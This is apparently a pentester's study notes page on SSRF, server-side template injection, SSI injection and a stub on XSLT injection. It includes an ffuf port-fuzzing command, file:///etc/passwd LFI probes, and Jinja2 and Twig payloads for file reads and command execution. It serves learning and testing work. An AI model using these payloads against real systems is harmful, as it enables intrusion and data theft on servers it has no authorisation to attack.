Navigation: [[Pentesting]]

---
# Table of Contents
1. Server-Side Request Forgery
2. Server-Side Template Injection
3. Server-Side Includes Injection
4. XSLT Injection

# SSRF
SSRF Is a vulnerability where attackers can manipulate a web app into sending unauthorized requests from the server. This usually happens when an app makes HTTP requests to other servers based on user input.

The following URI schemes are commonly used in SSRF:
- `HTTP/S` used to fetch content from other endpoints. The main use case for this is to bypass WAFs or access restricted endpoints.
- `file://` reads a file from the local system, can be used for local file inclusion.
- `gopher://` which is used to send arbitrary bytes to a specified address.

**Enumeration**
When observing requests through Burp, we might notice something like the following:
![[ssrf_identify_2.webp]]

We can see a secondary request being made here. To confirm if we can control this request, try changing the request to our own IP and start a netcat listener. If the netcat listener gets a request, we've confirmed that SSRF exists.

Beyond this, if we can see the contents of the request that was made, the SSRF is not blind.

Upon confirming the vulnerability, we can now use `FFUF` to fuzz:
```shell
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

**Exploitation**
First, we may be able to access restricted endpoints. We can fuzz the local subnet as needed. We can also do a directory brute force on the web server itself. We'll first need to find out which server is being used by accessing a non-existent page:
![[ssrf_exploit_2.webp]]

From there we can simply fuzz the local directory using [this](/opt/SecLists/Discovery/Web-Content/raft-small-words.txt) wordlist. We can also try LFI by supplying a URL such as `file:///etc/passwd` and seeing if this gets returned.

We can also use gopher to interact with internal services. Creating URIs for use with gopher can take a while, luckily there's a [tool](https://github.com/tarunkant/Gopherus) for that.

**Mitigating SSRF**
Reference the [OWASP Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
# SSTI
Web apps utilizing templates to generate responses can be vulnerable to SSTI. When an attacker can inject template code, SSTI is available. 

`PayloadAllTheThings` has a nice [guide](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) for exploiting SSTI. There's also one by [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php) that goes a bit more in depth.

A very nice tool we can use is [`SSTImap`](https://github.com/vladko312/SSTImap).

**Enumeration**
The most effective way to identify SSTI is to inject some special characters and check the behavior of the web app. A test string we can use that should work against most templates is:
```
${{<%[%'"}}%\.
```

Once we've confirmed the vulnerability exists, we should identify which template engine is being used next. Use the flowchart below:
![[Pasted image 20241130092307.png]]

Follow the red arrow if the web app errors out.

**Jinja Exploits**
```jinja2
# Information disclosure
{{ config.items() }}

# Dump built in functions
{{ self.__init__.__globals__.__builtins__ }}

# LFI
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

HackTricks made a very nice [guide](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) for Jinja specific SSTI.

**Twig Exploits**
```twig
# Information disclosure
{{ _self }}

# LFI
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# RCE 
{{ ['id'] | filter('system') }}
```
# SSI Injection
Server-Side Includes allows web apps to make dynamic content on HTML pages. It's supported by both Apache and IIS. Usually we can infer that it's being used based off of web extensions such as `.shtml`, `.shtm`, and `.stm`. Some configurations allow arbitrary file extensions to be used.

**SSI Directives**
SSI uses directives to generate content dynamically. It consists of the following components: name, parameter name, and value. It uses the following syntax:
```ssi
<!--#name param1="value1" param2="value" -->

Here's an example of config
<!--#config errmsg="Error!" -->

```

A list of payloads can be found [here](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Include%20Injection/#methodology). There's also a guide by [HackTricks](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection).

# XSLT Injection
This vulnerability involves manipulating XSLT transformations on the server. XSLT is used to transform XML documents into other formats.


---
Navigation: [[Pentesting]]